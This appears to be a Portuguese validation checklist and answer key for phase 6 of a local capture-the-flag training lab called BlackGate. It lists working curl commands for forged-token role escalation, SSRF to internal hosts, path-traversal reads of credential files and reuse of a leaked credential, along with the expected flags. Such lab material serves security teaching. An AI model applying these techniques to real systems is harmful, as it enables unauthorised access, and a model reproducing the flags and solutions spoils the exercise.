# Validação - Lab 05 BlackGate - Fase 6

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- serviço `blackgate` em execução;
- porta `8096:3000`.

## Health e recon público

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- `/health` retorna `1.5.0-phase6`;
- `/api/version` retorna build `bg-phase6-legacy-reuse`;
- client-config não contém flag nem credencial;
- debug não entrega endpoint final nem credencial.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fase 3 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Fase 4 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/metadata"
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Fase 5 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"
```

Resultado esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Ler arquivos de migração

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-migration-notes.txt"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/operator-archive-2026.txt"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/credential-review.txt"
```

Resultado esperado:

- arquivos restritos lidos via bypass controlado;
- conteúdo com decoys e pistas de realm.

## Ler arquivo de credenciais legado

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt"
```

Resultado esperado:

- arquivo com blocos `deprecated`, `disabled` e `maintenance-realm`;
- credencial de manutenção presente entre decoys.

## Path direto deve falhar

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/restricted/legacy-panel-creds.txt"
```

Resultado esperado:

- HTTP 403;
- `forbidden_path`.

## Legacy metadata

```bash
LEGACY_META=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_META"
```

Resultado esperado:

- `auth: legacy-realm`;
- `public_idp: false`;
- `gateway_required: true`.

## Legacy status

```bash
LEGACY_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/status"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_STATUS"
```

Resultado esperado:

- `/login` listado como disabled;
- `/auth` e `/maintenance` listados como enabled.

## Credencial errada

```bash
BAD_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=operator&pass=operator123"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$BAD_AUTH"
```

Resultado esperado:

- HTTP 401;
- `wrong_realm`.

## Autenticação correta

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

## Flag da Fase 6

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Resultado esperado:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## Rotas autenticadas no navegador

Após login, validar:

```text
/dashboard
/context
/gateway
/legacy
/files-vault
/tickets
/assets
/security-policy
/logout
```

## Checks estáticos

```bash
grep -R "809[0]" -n lab-05-blackgate || true
grep -R "FLAG{blackgate_legacy_credential_reuse_phase6}" -n lab-05-blackgate/README.md lab-05-blackgate/STUDENT-GUIDE.md lab-05-blackgate/src/public lab-05-blackgate/src/views || true
grep -R "migrate-yellow-gate" -n lab-05-blackgate/README.md lab-05-blackgate/STUDENT-GUIDE.md lab-05-blackgate/src/public lab-05-blackgate/src/views lab-05-blackgate/src/routes/api.js lab-05-blackgate/src/routes/debug.js lab-05-blackgate/src/routes/operator.js || true
```

Resultado esperado:

- nenhuma ocorrência da porta antiga;
- flag e credencial da Fase 6 não aparecem em README, Student Guide, JS público, views ou rotas públicas.
